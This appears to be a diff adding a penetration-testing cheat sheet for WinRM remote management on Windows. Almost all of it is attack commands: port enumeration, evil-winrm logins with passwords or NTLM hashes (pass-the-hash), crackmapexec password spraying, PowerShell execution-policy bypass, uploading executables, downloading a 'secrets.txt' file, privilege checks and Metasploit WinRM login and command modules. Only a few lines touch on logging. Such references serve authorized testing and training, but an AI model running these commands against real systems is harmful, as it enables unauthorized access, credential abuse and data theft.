@@ -1,0 +1,67 @@
+==============================
+WSMAN / WinRM (Web Services Management)
+Cheat Sheet – Professional
+==============================
+
+PORTS:
+5985/TCP – HTTP (default)
+5986/TCP – HTTPS (TLS)
+
+Transport:
+HTTP / HTTPS (SOAP over HTTP)
+
+Purpose:
+Remote management of Windows systems
+(PowerShell Remoting, Admin Automation)
+
+--------------------------------
+1. BASIC ENUMERATION
+--------------------------------
+
+nmap -p5985,5986 -sV <IP>
+nmap --script http-winrm-info -p5985,5986 <IP>
+curl -i http://<IP>:5985/wsman
+
+evil-winrm -i <IP> -u <user> -p <password>
+evil-winrm -i <IP> -u DOMAIN\\user -p <password>
+evil-winrm -i <IP> -u Administrator -H <NTLM_HASH>
+evil-winrm -i <IP> -u <user> -p <password> -S
+
+Enter-PSSession -ComputerName <IP> -Credential <user>
+crackmapexec winrm <IP> -u users.txt -p passwords.txt
+crackmapexec winrm <IP> -u <user> -p <password>
+
+# Direct command
+evil-winrm> whoami
+evil-winrm> hostname
+evil-winrm> ipconfig
+evil-winrm> upload script.ps1
+evil-winrm> powershell -ep bypass -f script.ps1
+
+evil-winrm> upload file.exe
+evil-winrm> download secrets.txt
+
+whoami /priv
+whoami /groups
+net localgroup administrators
+systeminfo
+
+# Pass-the-Hash
+evil-winrm -i <IP> -u Administrator -H <HASH>
+
+# Kerberos ticket (Pass-the-Ticket)
+klist
+Enter-PSSession -Authentication Kerberos
+
+winrm get winrm/config
+winrm enumerate winrm/config/listener
+
+Registry:
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN
+
+Event Viewer:
+- Microsoft-Windows-WinRM/Operational
+- Security logs (4624, 4672)
+
+use auxiliary/scanner/winrm/winrm_login
+use auxiliary/scanner/winrm/winrm_cmd
